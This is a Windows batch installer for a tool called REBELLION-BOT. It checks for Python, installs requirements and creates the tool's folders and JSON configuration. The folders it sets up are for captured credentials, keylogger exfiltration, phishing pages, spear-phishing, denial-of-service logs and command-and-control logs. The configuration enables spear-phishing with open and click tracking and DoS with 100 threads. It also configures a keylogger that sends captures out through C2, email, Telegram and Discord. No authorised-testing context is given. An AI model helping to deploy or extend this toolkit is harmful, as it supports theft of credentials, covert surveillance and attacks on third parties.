@echo off
REM REBELLION-BOT Installation Script for Windows
REM Author: Ian Carter Kulani

echo =============================================
echo  REBELLION-BOT Installation Script
echo =============================================
echo.

echo Checking Python installation...
python --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Python not found. Please install Python 3.7+
    echo Download from: https://www.python.org/downloads/
    pause
    exit /b 1
)

for /f "tokens=2" %%a in ('python -c "import sys; print(sys.version)"') do (
    set PYTHON_VERSION=%%a
)
echo [OK] Python %PYTHON_VERSION% detected

echo.
echo Installing Python dependencies...
python -m pip install --upgrade pip setuptools wheel
pip install -r requirements.txt

echo.
echo Creating directory structure...
mkdir .rebellion_bot 2>nul
mkdir .rebellion_bot\payloads 2>nul
mkdir .rebellion_bot\workspaces 2>nul
mkdir .rebellion_bot\scans 2>nul
mkdir .rebellion_bot\phishing_pages 2>nul
mkdir .rebellion_bot\phishing_templates 2>nul
mkdir .rebellion_bot\captured_credentials 2>nul
mkdir .rebellion_bot\ssh_keys 2>nul
mkdir .rebellion_bot\traffic_logs 2>nul
mkdir .rebellion_bot\nikto_results 2>nul
mkdir .rebellion_bot\keylog_exfil 2>nul
mkdir .rebellion_bot\deployments 2>nul
mkdir .rebellion_bot\domain_hosting 2>nul
mkdir .rebellion_bot\sessions 2>nul
mkdir .rebellion_bot\spear_phishing 2>nul
mkdir .rebellion_bot\email_templates 2>nul
mkdir .rebellion_bot\dos_logs 2>nul
mkdir .rebellion_bot\agents 2>nul
mkdir .rebellion_bot\c2_logs 2>nul
mkdir .rebellion_bot\modules 2>nul
mkdir .rebellion_bot\network_monitor 2>nul
mkdir .rebellion_bot\web_templates 2>nul
mkdir rebellion_reports 2>nul
mkdir rebellion_reports\graphics 2>nul
mkdir temp 2>nul

echo.
echo Creating configuration file...
(
echo {
echo     "version": "1.0.0",
echo     "auto_start": false,
echo     "auto_block_enabled": false,
echo     "auto_block_threshold": 5,
echo     "scan_timeout": 30,
echo     "report_format": "both",
echo     "generate_graphics": true,
echo     "keylogger": {
echo         "enabled": false,
echo         "hotkey": "f10",
echo         "log_file": ".rebellion_bot\\keylog.txt",
echo         "c2_server": "",
echo         "upload_interval": 30,
echo         "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
echo         "screenshot_interval": 60,
echo         "capture_clipboard": true
echo     },
echo     "web": {
echo         "enabled": false,
echo         "port": 5000,
echo         "host": "0.0.0.0",
echo         "require_auth": true,
echo         "username": "admin"
echo     },
echo     "spear_phishing": {
echo         "enabled": true,
echo         "smtp_server": "",
echo         "smtp_port": 587,
echo         "track_opens": true,
echo         "track_clicks": true
echo     },
echo     "dos": {
echo         "enabled": true,
echo         "max_threads": 100,
echo         "default_timeout": 60
echo     },
echo     "reports": {
echo         "enabled": true,
echo         "auto_generate": true,
echo         "format": "pdf",
echo         "include_graphics": true,
echo         "save_path": "rebellion_reports"
echo     }
echo }
) > .rebellion_bot\config.json

echo.
echo =============================================
echo  [OK] Installation complete!
echo =============================================
echo.
echo To run REBELLION-BOT:
echo   python rebellion_bot.py
echo.
echo To run as Administrator (recommended):
echo   Right-click Command Prompt -> Run as Administrator
echo   python rebellion_bot.py
echo.
pause